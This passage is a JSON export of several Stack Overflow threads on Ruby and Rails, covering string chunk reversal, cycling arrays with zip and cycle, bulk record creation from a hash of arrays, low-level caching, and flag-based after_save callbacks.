"creation_date": 1535348709, "answer_id": 52033166, "question_id": 52033057, "link": "https://stackoverflow.com/questions/52033057/how-to-move-characters-from-right-to-left-of-string/52033166#52033166", "title": "How to move characters from right to left of string", "body": "<pre><code>\"D21635D486450000C1\".scan(/.{1,2}/).reverse.join\n#=&gt; \"C100004586D43516D2\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 2, "last_activity_date": 1535349178, "last_edit_date": 1535349178, "creation_date": 1535348726, "answer_id": 52033172, "question_id": 52033057, "link": "https://stackoverflow.com/questions/52033057/how-to-move-characters-from-right-to-left-of-string/52033172#52033172", "title": "How to move characters from right to left of string", "body": "<pre><code>\"D21635D486450000C1\".chars.each_slice(2).to_a.reverse.join\n#\u21d2 \"C100004586D43516D2\"\n</code></pre>\n\n<p>or use <code>join(' ')</code> on the last step to have spaces or whatever between slices.</p>\n\n<hr>\n\n<p>Also:</p>\n\n<pre><code>str = \"D21635D486450000C1\"\n(0..str.length-1).step(2).map { |i| [str[-i-2], str[-i-1]] }.join\n#\u21d2 \"C100004586D43516D2\"\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6107140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0353ccbacc3a76b622a6a786e6b9e775?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/6107140/mike"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 319, "favorite_count": 0, "closed_date": 1535353697, "accepted_answer_id": 52033172, "answer_count": 3, "score": 0, "last_activity_date": 1535349178, "creation_date": 1535347970, "last_edit_date": 1535348757, "question_id": 52033057, "link": "https://stackoverflow.com/questions/52033057/how-to-move-characters-from-right-to-left-of-string", "closed_reason": "Duplicate", "title": "How to move characters from right to left of string", "body": "<p>I need to move characters from left to right of a string in combinations of two. An example input is:</p>\n\n<pre><code>\"D21635D486450000C1\"\n</code></pre>\n\n<p>The expected output for this is:</p>\n\n<pre><code>\"C100004586D43516D2\"\n</code></pre>\n\n<p>Any help is greatly appreciated.</p>\n\n<p>I have this so far:</p>\n\n<pre><code>str = \"D21635D486450000C1\"\nstr.length.times do |i|\n str.insert(i, str[-2-i])\nend\nputs str\n</code></pre>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 3, "creation_date": 1535344120, "post_id": 52032252, "comment_id": 91015291, "body": "Please edit to show the desired result (array) for your example."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1535397602, "post_id": 52032252, "comment_id": 91042336, "body": "My comment above and comments on my answer make it abundantly clear that we don&#39;t understand your question. You have read those comments but for some reason have not clarified your question. That earns a downvote from me (which I&#39;ll retract if you clarify your question)."}], "answers": [{"tags": [], "owner": {"reputation": 11394, "user_id": 794481, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/344337b6819f2f513fa80bb227be3c2d?s=128&d=identicon&r=PG", "display_name": "Tallboy", "link": "https://stackoverflow.com/users/794481/tallboy"}, "is_accepted": false, "score": 0, "last_activity_date": 1535341937, "creation_date": 1535341937, "answer_id": 52032351, "question_id": 52032252, "link": "https://stackoverflow.com/questions/52032252/repeating-a-loop-when-it-reaches-the-end/52032351#52032351", "title": "Repeating a loop when it reaches the end", "body": "<p>It works by using the <code>%</code> operator to cycle through the indexes.</p>\n\n<pre><code>numbers_array = [1,2,3,4,5,6,7,8,9,10]\nadd_to_array = [1,2,3,4]\n\nnumbers_array.map.with_index do |n, i|\n  n + add_to_array[i % add_to_array.length]\nend\n</code></pre>\n\n<p>A cool method that's similar, if you didn't want to start over at the next array, would be <code>.zip</code></p>\n\n<p><a href=\"https://apidock.com/ruby/Array/zip\" rel=\"nofollow noreferrer\">https://apidock.com/ruby/Array/zip</a></p>\n"}, {"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 8, "last_activity_date": 1535343971, "last_edit_date": 1535343971, "creation_date": 1535343659, "answer_id": 52032522, "question_id": 52032252, "link": "https://stackoverflow.com/questions/52032252/repeating-a-loop-when-it-reaches-the-end/52032522#52032522", "title": "Repeating a loop when it reaches the end", "body": "<p>You are looking for <a href=\"https://ruby-doc.org/core/Enumerable.html#method-i-zip\" rel=\"noreferrer\"><code>Enumerable#zip</code></a> and <a href=\"https://ruby-doc.org/core-2.5.1/Enumerable.html#method-i-cycle\" rel=\"noreferrer\"><code>Enumerable#cycle</code></a>:</p>\n\n<pre><code>numbers_array = [1,2,3,4,5,6,7,8,9,10]\n#\u21d2 [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nadd_to_array = [1,2,3,4]\n#\u21d2 [1, 2, 3, 4]\nnumbers_array.zip(add_to_array.cycle)\n#\u21d2  [[1, 1], [2, 2], [3, 3], [4, 4], [5, 1],\n#    [6, 2], [7, 3], [8, 4], [9, 1], [10, 2]]\n</code></pre>\n\n<p>Now do whatever you want with the array returned. E.g. to reduce the zipped result summing elements, map ro <a href=\"https://ruby-doc.org/core/Enumerable.html#method-i-sum\" rel=\"noreferrer\"><code>Enumerable#sum</code></a>:</p>\n\n<pre><code>numbers_array.zip(add_to_array.cycle).map(&amp;:sum)\n#\u21d2 [2, 4, 6, 8, 6, 8, 10, 12, 10, 12]\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535345764, "post_id": 52032755, "comment_id": 91015663, "body": "I doubt this is what OP expects. Please check my answer for the desired output (last line.) It\u2019s still my wild guess, though."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535345894, "post_id": 52032755, "comment_id": 91015694, "body": "@mudasobwa, I had noticed. I asked the OP to clarify by showing the desired result."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535345935, "post_id": 52032755, "comment_id": 91015702, "body": "<i>\u201cat <code>numbers_array[4]</code> we would be adding <code>add_to_array[0]</code> then adding <code>numbers_array[5]</code> to <code>add_to_array[1]</code>\u201d</i>..."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535350509, "post_id": 52032755, "comment_id": 91017026, "body": "@mudasobwa, is that not what I&#39;m doing (except I&#39;m not mutating <code>add_to_array</code>)?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535350581, "post_id": 52032755, "comment_id": 91017057, "body": "\u201cat <code>numbers_array[4]</code>\u201d wording already implies there are at least five elements and your result contains only four."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1535351229, "post_id": 52032755, "comment_id": 91017264, "body": "I interpreted &quot;at <code>numbers_array[4]</code> we would be adding <code>add_to_array[0]</code>&quot; as being followed by, &quot;with the sum saved in <code>add_to_array[0]</code>&quot;. Either interpretation is possible. We&#39;ll just have to wait for a clarification. In any event, we&#39;ve provided the OP with a bonus, by answering two questions."}], "tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 0, "last_activity_date": 1535345829, "last_edit_date": 1535345829, "creation_date": 1535345649, "answer_id": 52032755, "question_id": 52032252, "link": "https://stackoverflow.com/questions/52032252/repeating-a-loop-when-it-reaches-the-end/52032755#52032755", "title": "Repeating a loop when it reaches the end", "body": "<pre><code>add_to_array.zip(*numbers_array.each_slice(add_to_array.size)).\n             map { |a| a.sum { |e| e.to_i } }\n  #=&gt; [16, 20, 13, 16]\n</code></pre>\n\n<p><code>e.to_i</code> is needed to convert <code>nil</code> values to zeros. See <a href=\"http://ruby-doc.org/core-2.5.1/NilClass.html#method-i-to_i\" rel=\"nofollow noreferrer\">NilClass#to_i</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": false, "score": 0, "last_activity_date": 1535348295, "creation_date": 1535348295, "answer_id": 52033116, "question_id": 52032252, "link": "https://stackoverflow.com/questions/52032252/repeating-a-loop-when-it-reaches-the-end/52033116#52033116", "title": "Repeating a loop when it reaches the end", "body": "<p>Another option:</p>\n\n<pre><code>numbers_array.map { |e| e + add_to_array.rotate!.last }\n\n# =&gt; [2, 4, 6, 8, 6, 8, 10, 12, 10, 12]\n</code></pre>\n\n<p>Drawback: add_to_array is mutated by <code>rotate!</code></p>\n"}], "owner": {"reputation": 309, "user_id": 3763875, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/709acbe23fdd7a824379bfbb728a42b1?s=128&d=identicon&r=PG&f=1", "display_name": "user3763875", "link": "https://stackoverflow.com/users/3763875/user3763875"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "accepted_answer_id": 52032522, "answer_count": 4, "score": 0, "last_activity_date": 1535348295, "creation_date": 1535340931, "last_edit_date": 1535344072, "question_id": 52032252, "link": "https://stackoverflow.com/questions/52032252/repeating-a-loop-when-it-reaches-the-end", "title": "Repeating a loop when it reaches the end", "body": "<p>I am trying to conceptualize the iteration of two loops</p>\n\n<pre><code>numbers_array = [1,2,3,4,5,6,7,8,9,10]\nadd_to_array = [1,2,3,4]\n</code></pre>\n\n<p>While the <code>numbers_array</code> iterates, <code>add_to_array</code> iterates simultaneously adding both elements together at the same time. The caveat is once <code>add_to_array</code> reaches the end, it starts over adding its element to the next index in <code>numbers_array</code>. So at <code>numbers_array[4]</code> we would be adding <code>add_to_array[0]</code> then adding <code>numbers_array[5]</code> to <code>add_to_array[1]</code> and so on. This process would repeat until we reach the end of the <code>numbers_array</code>.</p>\n\n<p>Any input would be greatly appreciated!</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rails-activerecord"], "comments": [{"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1535338963, "post_id": 52031924, "comment_id": 91014387, "body": "<code>hash of arrays within a hash</code> is a bit confusing. Is it always as in your example?"}, {"owner": {"reputation": 11, "user_id": 10277847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/62c6f3ed5f173aa861d1578edbfd818b?s=128&d=identicon&r=PG&f=1", "display_name": "Steve_BN", "link": "https://stackoverflow.com/users/10277847/steve-bn"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1535380070, "post_id": 52031924, "comment_id": 91033650, "body": "Yes, it always is."}], "answers": [{"tags": [], "owner": {"reputation": 7734, "user_id": 2490003, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/3dRD0.png?s=128&g=1", "display_name": "user2490003", "link": "https://stackoverflow.com/users/2490003/user2490003"}, "is_accepted": false, "score": 0, "last_activity_date": 1535339189, "creation_date": 1535339189, "answer_id": 52032055, "question_id": 52031924, "link": "https://stackoverflow.com/questions/52031924/creating-multiple-records-in-ruby-from-a-hash-of-arrays/52032055#52032055", "title": "Creating multiple records in ruby from a hash of arrays", "body": "<p>How about an approach like -</p>\n\n<pre><code>def create_records_from_responses!(responses)\n  items = responses.values.first.length\n  fields = responses.keys\n  users = []\n\n  # Don't process an empty set\n  return if items.zero?\n\n  # Wrap creation of User objects in a transaction\n  # If one fails, it rolls back all created records\n  # As per transaction documentation, you still have to manually\n  # handle the propagated error\n  # See: https://api.rubyonrails.org/classes/ActiveRecord/Transactions/ClassMethods.html\n  # In this case we named the method with a `!` to indicate that it might raise\n  # an error. Whatever is calling this should rescue and handle the error\n\n  ActiveRecord::Base.transaction do\n    (0..items).each do |i|\n      attributes = {}\n      fields.each { |field| attributes[field] = responses[field][i] }\n\n      users &lt;&lt; User.create!(attributes)\n    end\n  end\n\n  users\n</code></pre>\n\n<p>This makes 2 assumptions -</p>\n\n<ol>\n<li><p>Your <code>responses</code> hash is correctly formed. If there are mismatched arrays for each key then things could go wrong. You should validate its form beforehand</p></li>\n<li><p>The number of users you're creating isn't huge. As you can see it rebuilds the <code>attributes</code> in each loop. It's not a huge deal if it's 10-20 records but consider optimizing that if you're handling more.</p></li>\n</ol>\n"}, {"tags": [], "owner": {"reputation": 778, "user_id": 2125795, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7EreQ.jpg?s=128&g=1", "display_name": "Billy Kimble", "link": "https://stackoverflow.com/users/2125795/billy-kimble"}, "is_accepted": false, "score": 0, "last_activity_date": 1535341257, "last_edit_date": 1535341257, "creation_date": 1535339249, "answer_id": 52032060, "question_id": 52031924, "link": "https://stackoverflow.com/questions/52031924/creating-multiple-records-in-ruby-from-a-hash-of-arrays/52032060#52032060", "title": "Creating multiple records in ruby from a hash of arrays", "body": "<p>As long as you are guaranteed the length of the arrays is the same, and the order does not change, you can do something like:</p>\n\n<pre><code>data = {\n  first_name: [\"John\", \"Tom\", \"Michael\"],\n  last_name: [\"Smith\", \"Watts\",\"Pit\"],\n  email: [\"John.smith@gmail.com\", \"tom.watts@gmail.com\",  \"mike.pit@gmail.com\"]\n}\n\n0.upto(data[:first_name].length-1) do |i|\n  record = {\n    first_name: data[:first_name][i],\n    last_name: data[:last_name][i],\n    email: data[:email][i]\n  }\n  User.create!(record)\nend\n</code></pre>\n\n<p>You can also get crazy with .zip and .each_slice, though I think the above is more straightforward and clear.</p>\n\n<pre><code>maxlen = data[:first_name].length\nfirst_name_fields = Array.new(maxlen, 'first_name')\nlast_name_fields = Array.new(maxlen, 'last_name')\nemail_fields = Array.new(maxlen, 'email')\nrecords = first_name_fields.zip(data[:first_name], last_name_fields, data[:last_name], email_fields, data[:email])\nrecords.map!{|x| x.each_slice(2).to_a.to_h}\nrecords.each{|record| User.create!(record)}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 10277847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/62c6f3ed5f173aa861d1578edbfd818b?s=128&d=identicon&r=PG&f=1", "display_name": "Steve_BN", "link": "https://stackoverflow.com/users/10277847/steve-bn"}, "edited": false, "score": 0, "creation_date": 1535380028, "post_id": 52032706, "comment_id": 91033631, "body": "I like the simplicity of this answer. Unfortunately some of my field names don&#39;t directly match to the hash keys, so I need to manually associate them."}], "tags": [], "owner": {"reputation": 167912, "user_id": 240443, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/495d675e3bc42ed1dee469e2ce701f1b?s=128&d=identicon&r=PG", "display_name": "Amadan", "link": "https://stackoverflow.com/users/240443/amadan"}, "is_accepted": false, "score": 0, "last_activity_date": 1535345242, "creation_date": 1535345242, "answer_id": 52032706, "question_id": 52031924, "link": "https://stackoverflow.com/questions/52031924/creating-multiple-records-in-ruby-from-a-hash-of-arrays/52032706#52032706", "title": "Creating multiple records in ruby from a hash of arrays", "body": "<p>As simple as this:</p>\n\n<pre><code>response.values.transpose.each { |record|\n  User.create!(data.keys.zip(record).to_h)\n}\n</code></pre>\n\n<p><code>response.values</code> will give us an array of arrays (array of field values for each field), and <code>transpose</code> will flip it around so we have array of records. Then for each record, just add field names, hashify and pass to <code>#create!</code>.</p>\n"}], "owner": {"reputation": 11, "user_id": 10277847, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/62c6f3ed5f173aa861d1578edbfd818b?s=128&d=identicon&r=PG&f=1", "display_name": "Steve_BN", "link": "https://stackoverflow.com/users/10277847/steve-bn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 474, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1535437117, "creation_date": 1535337686, "last_edit_date": 1535437117, "question_id": 52031924, "link": "https://stackoverflow.com/questions/52031924/creating-multiple-records-in-ruby-from-a-hash-of-arrays", "title": "Creating multiple records in ruby from a hash of arrays", "body": "<p>I have a response consisting of a hash of arrays within a hash.  I need to create three records (see below) in ruby/rails.</p>\n\n<pre><code>{\n    \"first_name\" =&gt; [John, Tom, Michael],\n    \"last_name\" =&gt; [Smith, Watts, Pit],\n    \"email\" =&gt; [John.smith@gmail.com, tom.watts@gmail.com,  mike.pit@gmail.com]\n}\n\nid  || first_name   || last_name  || email\n----------------------------------------------\n1   || John         ||  Smith     || john.smith@gmail.com\n2   || Tom          ||  Watts     || tom.watts@gmail.com\n3   || Michael      ||  Pit       || mike.pit@gmail.com\n</code></pre>\n\n<p>I'm having difficulties understanding how to approach this. Any help would be very appreciated.</p>\n\n<p>So far I have:</p>\n\n<pre><code>response.keys.each do |field_name|\n  response[field_name].each do |value|\n     puts \"#{field_name} =&gt; #{value}\"\n     User.create!(\n       first_name: value['first_name'],\n       last_name: value['last_name'],\n       email:  value['email']\n     )\n  end\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "caching", "web", "optimization"], "answers": [{"comments": [{"owner": {"reputation": 145, "user_id": 3843071, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4336af5818b18e1047d2d23c148fd5e3?s=128&d=identicon&r=PG&f=1", "display_name": "Codosapien", "link": "https://stackoverflow.com/users/3843071/codosapien"}, "edited": false, "score": 0, "creation_date": 1535343784, "post_id": 52031756, "comment_id": 91015238, "body": "Thanks for the detailed response and pointing me further down the guide to low level caching. It says it can store <i>any</i> time of info, but earlier it says not to assume a non-memstore service can handle more than simple data types... I guess I need to experiment if I don&#39;t use the built in memstore."}], "tags": [], "owner": {"reputation": 13378, "user_id": 1430810, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/v669u.jpg?s=128&g=1", "display_name": "arieljuod", "link": "https://stackoverflow.com/users/1430810/arieljuod"}, "is_accepted": false, "score": 3, "last_activity_date": 1535335734, "creation_date": 1535335734, "answer_id": 52031756, "question_id": 52031517, "link": "https://stackoverflow.com/questions/52031517/how-does-a-rail-fragment-cache-benefit-your-app-i-e-prevent-database-calls/52031756#52031756", "title": "How does a Rail fragment cache benefit your app, i.e. prevent database calls?", "body": "<p>The Rails Guides example for fragment caching refers only to cache the view generated to show an object, but not the query, that's why you can't see where it caches the query, because it doesn't.</p>\n\n<p>You can use low-level caching to cache the <code>@categories</code> query <a href=\"https://guides.rubyonrails.org/caching_with_rails.html#low-level-caching\" rel=\"nofollow noreferrer\">https://guides.rubyonrails.org/caching_with_rails.html#low-level-caching</a></p>\n\n<p>It can cache any kind of information, so, you could have something like</p>\n\n<pre><code>class Category &lt; ActiveRecord::Base\n  def self.for_navbar\n    Rails.cache.fetch(\"#{nav_cache_key}/categories_for_navbar\", expires_in: 1.week) do\n      self.whatever_scope_you_need\n    end\n  end\nend\n</code></pre>\n\n<p>What you will need to change is the <code>nav_cache_key</code> var that's used to identify the cache. I'm not sure about a best practice with this, but I would set a class variable the first time you need it with the current time_stamp and update it whenever the cache should be wiped.</p>\n\n<p>Something like</p>\n\n<pre><code>def self.navbar_cache_key\n  @@navbar_cache_key ||= Time.now\nend\n\nafter_update :change_cache_key\n\ndef change_cache_key\n  @@navbar_cache_key = Time.now\nend\n</code></pre>\n\n<p>That way, every time a category is updated, it will change the <code>@@navbar_cache_key</code> for the class and the cache will be updated for the new key. I'm not sure what are the real conditions where the cache need to be updated, maybe the <code>after_update</code> callback is not the best or you need some extra actions.</p>\n\n<p>This will cache only the query (not sure if you need to cache an array or caching the query works the same, maye you need a <code>.to_a</code> at the end), you can still use fragment caching if you want to cache the <code>li</code> elements too.</p>\n\n<p>I suppose you could even cache the full html of the categories, since low-level cache accepts any kind of info, you only need to find the right place to use <code>Rails.cache.fetch</code> and the right place to save/update the cache key.</p>\n"}], "owner": {"reputation": 145, "user_id": 3843071, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/4336af5818b18e1047d2d23c148fd5e3?s=128&d=identicon&r=PG&f=1", "display_name": "Codosapien", "link": "https://stackoverflow.com/users/3843071/codosapien"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1535335734, "creation_date": 1535332989, "question_id": 52031517, "link": "https://stackoverflow.com/questions/52031517/how-does-a-rail-fragment-cache-benefit-your-app-i-e-prevent-database-calls", "title": "How does a Rail fragment cache benefit your app, i.e. prevent database calls?", "body": "<p>The information in my header/footer is derived from a bunch of dictionary tables in my database, and the data is going to change extremely infrequently. I would think this is the perfect opportunity for caching, so that every page won't touch the database as far as rendering the header/footer is concerned.</p>\n\n<p>The Rails guide gives an example of fragment caching so I'm thinking for my nav links would be something like...</p>\n\n<pre><code>&lt;% @categories.each do |category| %&gt;\n  &lt;% cache category do %&gt;\n    &lt;li class=\"nav-link\"&gt;\n      &lt;%= link_to category.name, category_path(category) %&gt;\n    &lt;/li&gt;\n  &lt;% end %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>But I don't understand how this prevents contact with the database or optimizes anything. The controller is making the call for @categories before the view renders which means the SQL query is made every page request... some HTML is being cached, but is the rendering process really a significant saving even for a larger snippet?? I feel like the strain on the database is what you really want to be limiting especially if dealing with a lot of concurrent traffic.</p>\n\n<p>What is the appropriate caching strategy for things like footer / navigation partials.?</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"tags": [], "owner": {"reputation": 7734, "user_id": 2490003, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/3dRD0.png?s=128&g=1", "display_name": "user2490003", "link": "https://stackoverflow.com/users/2490003/user2490003"}, "is_accepted": true, "score": 1, "last_activity_date": 1535333502, "creation_date": 1535333502, "answer_id": 52031569, "question_id": 52031451, "link": "https://stackoverflow.com/questions/52031451/rails-model-call-different-class-based-on-user-flag/52031569#52031569", "title": "Rails model call different class based on user flag", "body": "<p>As with many design decisions, there's numerous approaches you could, each of which would be \"correct\" mostly based on preference. Here's how I'd do it. </p>\n\n<p>Firstly, I'd make sure <code>@user.flags</code> can only take on certain values since its value is being used to decide other actions. In Ruby the generally accepted way of handling these values is also as symbols since a given symbol is immutable. </p>\n\n<p>Secondly, since you're doing something with the <code>Message</code> model after it's saved you can utilize the <a href=\"https://api.rubyonrails.org/classes/ActiveRecord/Callbacks.html\" rel=\"nofollow noreferrer\"><code>after_save</code> callback</a> and keep the action inside the <code>Message</code> model itself. This makes it more tied to the message model and makes it more readable in general.</p>\n\n<p>Lastly, you'll want some sort of guarantee that your save/transaction rolls back if there's an error with your <code>after_save</code> action. Going off <a href=\"https://stackoverflow.com/a/37353477/2490003\">this answer</a> you can do that by raising an error in `after_save_</p>\n\n<p>In <code>app/models/user.rb</code></p>\n\n<pre><code>class User &lt; ActiveRecord::Base\n  FLAGS = %w[alpha beta gamma].freeze\n\n  # Ensuure that `flag` field can only take on certain pre-defined values\n  # Also validate that flag can never be nil. You may need to change that\n  # as needed for your application\n  validates :flag, presence: true, inclusion: FLAGS\n\n  def flag\n    # This method isn't 100% necessary but I like to personally follow \n    # the pracitce of returning symbols for enumerated values\n    super(flag).try(:to_sym)\n  end\nend\n</code></pre>\n\n<p>In <code>app/models/message.rb</code></p>\n\n<pre><code>class Message &lt; ActiveRecord::Base\n  after_save :post_process_message\n\n  private\n\n  # I'd recommend a better name for this method based on what you're\n  # specifically doing\n  def post_process_message\n    # Notice the more descriptive method name\n    # Also no need to pass `message` as a param since it's now located\n    # inside this model. You could also move it to a separate class/service\n    # as needed but don't over-optimize until you need to\n    send(\"handle_post_process_for_flag_#{user.flag}\")\n  rescue StandardError =&gt; e\n    # Something went wrong, rollback!\n    # It isn't \"great practice\" to rescue all errors so you may want to replace\n    # this with whatever errrors you excpect your methods to throw. But if you\n    # need to, it's fine to be conservative and rescue all on a case-by-case\n    # basis\n    raise ActiveRecord::RecordInvalid.new(self)\n  end\n\n  def handle_post_process_for_flag_alpha\n  end\n\n  def handle_post_process_for_flag_beta\n  end\n\n  def handle_post_process_for_flag_gamma\n  end\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 67, "user_id": 9732722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d51ae9bf08232bc377afdfc7671105e9?s=128&d=identicon&r=PG&f=1", "display_name": "Paco V.", "link": "https://stackoverflow.com/users/9732722/paco-v"}, "edited": false, "score": 0, "creation_date": 1535708209, "post_id": 52038237, "comment_id": 91175628, "body": "Thanks a bunch for your clarification :) I liked it very much!"}], "tags": [], "owner": {"reputation": 16077, "user_id": 319702, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Rb5G2.jpg?s=128&g=1", "display_name": "sameera207", "link": "https://stackoverflow.com/users/319702/sameera207"}, "is_accepted": false, "score": 0, "last_activity_date": 1535369094, "creation_date": 1535369094, "answer_id": 52038237, "question_id": 52031451, "link": "https://stackoverflow.com/questions/52031451/rails-model-call-different-class-based-on-user-flag/52038237#52038237", "title": "Rails model call different class based on user flag", "body": "<p>This is an interesting question, as @user2490003 said, there is no write/wrong way of doing this. </p>\n\n<p>Your approach will change depending on how your A,B and C classes implement and their representation and also what your method does in each class.</p>\n\n<p>Let's take an example, a method called <code>talk</code> and two classes <code>Man</code>, <code>Women</code>. </p>\n\n<p>So, you may implement this as </p>\n\n<h2>Individual class methods</h2>\n\n<pre><code>class Man\n  def talk\n    # talk like an adult\n  end\nend\n\nclass Women\n  def talk\n    # talk like an adult\n  end\nend\n</code></pre>\n\n<p>However as you can see, this <code>talk</code> method is same for both <code>Man</code> and <code>Women</code> and also you can see they both normally share the same functionalities and attributes. So, create a base class called <code>Human</code> and move the <code>talk</code> method there</p>\n\n<h2>As a base class method</h2>\n\n<pre><code>class Human\n  def talk\n    # talk like an adult\n  end\nend\n\nclass Man &lt; Human\n\nend\n\nclass Woman &lt; Human\n\nend\n</code></pre>\n\n<p>Now let's get an example of a baby and say baby <code>talk</code> differently than Man and Woman, although baby still inherits from <code>Human</code>. In such cases you can do</p>\n\n<pre><code>class Baby &lt; Human\n  